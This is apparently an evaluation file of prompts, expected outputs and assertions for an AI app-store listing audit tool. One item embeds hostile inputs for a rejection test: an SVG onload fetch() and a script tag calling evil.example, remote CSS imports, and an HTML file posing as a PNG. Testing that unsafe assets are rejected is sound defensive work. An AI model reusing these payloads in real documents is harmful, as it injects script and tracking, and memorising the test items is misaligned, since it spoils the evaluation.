evals.prompt: Audit this captured public Apple App Store listing for Trail Ledger before the autumn release. Store ID: 123456789; canonical URL: https://apps.apple.com/us/app/trail-ledger/id123456789; storefront: US; locale: en-US; capture date: 2026-07-20. Captured fields: name 'Trail Ledger'; subtitle 'Plan every hike'; promotional text 'Offline trail maps for summer'; description opens with 'Save routes, record mileage, and share trail notes.' The dated campaign record says the summer promotion ended 2026-07-01 and the current autumn brief emphasizes all-season offline navigation. Store-browse viewport is 412x732 CSS px with screenshots rendered at 360 CSS px wide. Screenshot 1 says 'Choose a route' at 26 CSS px with 5.2:1 contrast and no obstruction; it shows route selection but does not show offline navigation or mileage recording. Screenshot 2 says 'Track the climb' at 16 CSS px with 1.9:1 contrast and has 20 CSS px of its lower caption obscured by the phone mockup. Screenshot 3 says 'Save notes' at 24 CSS px with 6.1:1 contrast and no obstruction. The sequence covers planning, tracking, and notes but supplies no concluding user benefit. App preview: present, 15 seconds, opens on an unlabeled map, shows route recording, and ends before a saved-route result. Rating 4.6 from 842 ratings; visible review excerpt: 'Easy to use, but export is hard to find.'; age rating 4+ with no inconsistent listing claim; release notes dated 2026-07-12 state 'Added home-screen widgets' with no contradictory listing claim; dated query-result capture supplied for 'trail planner'. The App Store Connect keyword field, product-page optimization plan, and experiment result are unavailable. Use the fixed Apple six-dimension card and this exact check trace: APL-DSC-01 partial 5/10 finding F-DSC-01; APL-DSC-02 unavailable max 10; APL-MET-01 partial 3/6 finding F-MET-01; APL-MET-02 pass 5/5; APL-MET-03 fail 0/3 finding F-MET-03; APL-MET-04 partial 3/6 finding F-MET-04; APL-CRT-01 partial 4/8 finding F-CRT-01; APL-CRT-02 partial 4/8 finding F-CRT-02; APL-CRT-03 partial 2.5/5 finding F-CRT-03; APL-CRT-04 partial 2/4 finding F-CRT-04; APL-TRU-01 pass 3/3; APL-TRU-02 partial 2.5/5 finding F-TRU-02; APL-TRU-03 pass 3/3; APL-TRU-04 pass 4/4; APL-LOC-01 pass 5/5; APL-LOC-02 pass 5/5; APL-EXP-01 unavailable max 5; APL-EXP-02 unavailable max 5. Report the calculated evidence coverage and score.
evals.expected_output: Runs a public-first Apple listing audit from the dated capture before requesting private evidence. It uses the approved six-dimension Apple card, applies only 100/50/0 awards to assessed checks, keeps unavailable checks outside score math, and reports the exact check-level trace with finding-linked deductions.
assertions: Selects listing mode.
Routes the supplied URL to Apple App Store analysis.
Begins with the supplied public listing capture.
Reports the capture date.
Does not require App Store Connect access before starting the audit.
Checks the app name as an Apple listing field.
Checks the subtitle as an Apple listing field.
Checks the promotional text when publicly displayed.
Checks the description as an Apple listing field.
Checks the keyword field status as unavailable without console evidence.
Checks screenshots as Apple creative assets.
Checks app preview availability when publicly displayed.
Checks visible ratings on the listing.
Checks visible written reviews on the listing.
Labels direct listing observations verified.
Labels explanations without supporting data inferred.
Labels inaccessible console metrics unavailable.
Uses a fixed Apple scoring rubric.
Uses the fixed six-dimension Apple card.
Awards pass checks 100 percent of their fixed maximum.
Awards partial checks 50 percent of their fixed maximum.
Awards fail checks 0 percent of their fixed maximum.
Reports APL-DSC-01 as partial at 5/10.
Reports APL-DSC-02 unavailable with maximum 10.
Reports APL-MET-01 as partial at 3/6.
Reports APL-MET-02 as pass at 5/5.
Reports APL-MET-03 as fail at 0/3.
Reports APL-MET-04 as partial at 3/6.
Reports APL-CRT-01 as partial at 4/8.
Reports APL-CRT-02 as partial at 4/8.

Reports APL-CRT-04 as partial at 2/4.
Reports APL-TRU-01 as pass at 3/3.
Reports APL-TRU-02 as partial at 2.5/5.

Reports APL-LOC-02 as pass at 5/5.

Scores creative under the shared audit dimensions.
Scores review reputation under the shared audit dimensions.

evals.prompt: Only audit the first three portrait screenshots from this captured US Google Play listing for a meditation timer. Package: com.example.meditationtimer; canonical URL: https://play.google.com/store/apps/details?id=com.example.meditationtimer; locale: en-US; country: US; capture date: 2026-07-20. Store-browse preview viewport: 412x732 CSS px; rendered screenshot width: 360 CSS px. Screenshot 1, 1080x1920: headline 'One minute to settle' at 27 CSS px, white on #173D63 with 11.15:1 contrast, positioned 84 CSS px below the top, fully visible; phone image shows a circular timer. Screenshot 2, 1080x1920: headline 'Pick a sound' at 16 CSS px, #A0B0B5 on #E6E9EA with 1.84:1 contrast, with its lower 18 CSS px hidden behind the phone mockup; phone image shows rain, waves, and bell choices. Screenshot 3, 1080x1920: headline 'Keep your streak' at 24 CSS px, white on #24543D with 8.71:1 contrast, fully visible; phone image shows a seven-day calendar. I am deciding whether their first-impression story works. Do not review metadata, ratings, or the app itself.
evals.expected_output: Runs a focused creative audit constrained to the supplied screenshot capture and US market. It evaluates only observable first-impression evidence, marks performance evidence unavailable, and does not expand to an overall listing review or make conversion claims.

evals.prompt: Compare these captured UK Apple App Store listings for the query 'video editor'. Capture date: 2026-07-20. FlowCut: ID 1111111111, canonical URL https://apps.apple.com/gb/app/flowcut/id1111111111, name 'FlowCut', subtitle 'Fast clips for creators', rating 4.7 from 9,100 ratings, first screenshot headline 'Cut a reel in seconds'. Slice Studio: ID 2222222222, canonical URL https://apps.apple.com/gb/app/slice-studio/id2222222222, name 'Slice Studio', subtitle 'Edit videos with precision', rating 4.3 from 2,040 ratings, first screenshot headline 'Frame-perfect trimming'. Trimly: ID 3333333333, canonical URL https://apps.apple.com/gb/app/trimly/id3333333333, name 'Trimly', subtitle 'Simple video maker', rating 4.5 from 680 ratings, first screenshot headline 'Make a video today'. No dated written-review sample is supplied for any app. No query-result capture is supplied. Do not compare them to Google Play versions or claim who ranks first.

evals.prompt: Create a single offline HTML ASO audit report from this inline evidence. CSS payload text: @import url('https://fonts.example/evil.woff2'); .hero{background:url(https://tracker.example/pixel)}. SVG payload text: <svg xmlns='http://www.w3.org/2000/svg' onload='fetch("https://evil.example/onload")'><script>alert(1)</script><image href='https://evil.example/pixel'/></svg>. Asset hero.png declares Content-Type image/png, but its decoded first bytes are 3c 21 44 4f 43 54 59 50 45 20 68 74 6d 6c 3e, which decode to <!DOCTYPE html>; it has no PNG signature. Asset safe-logo.png declares image/png, Content-Length 70, dimensions 1x1, decoded signature 89 50 4e 47 0d 0a 1a 0a, and data URI data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQIHWP4z8DwHwAFgAI/ScLGrQAAAABJRU5ErkJggg==. Asset hero.jpg declares image/jpeg, Content-Length 33554432, dimensions 10000x8000. The report must be safe to email and useful when unsafe assets are rejected.
evals.expected_output: Treats standalone HTML as a constrained report format. It produces one locally openable document that rejects the supplied executable, remote, disguised, and oversized inputs; accepts only the supplied safe PNG when needed; never embeds unsafe content; and replaces rejected visual inputs with inert placeholders while preserving the report findings and evidence states.
assertions: Treats standalone HTML as the requested output format.
Produces one self-contained HTML document.
Does not require a development server.
Does not fetch remote fonts.
Does not fetch the remote CSS URL asset.
Rejects CSS that references remote URLs.

evals.prompt: Apple changed its screenshot-count requirement last week. Tell us the exact current rule and mark our listing noncompliant. I have no current Apple documentation, primary-source citation, retrieval date, or product-page evidence to share. A publication date or update date may not be exposed by the eventual source.
evals.expected_output: Recognizes that the requested platform rule is time-sensitive and cannot be verified from the supplied information. It retrieves a current primary Apple source when it can or requests one when it cannot, requires a citation and retrieval date for every verified policy statement, records a publication or update date only when exposed, avoids declaring noncompliance, and provides a bounded verification path rather than repeating stale guidance.

Does not declare the listing noncompliant without applicable evidence.
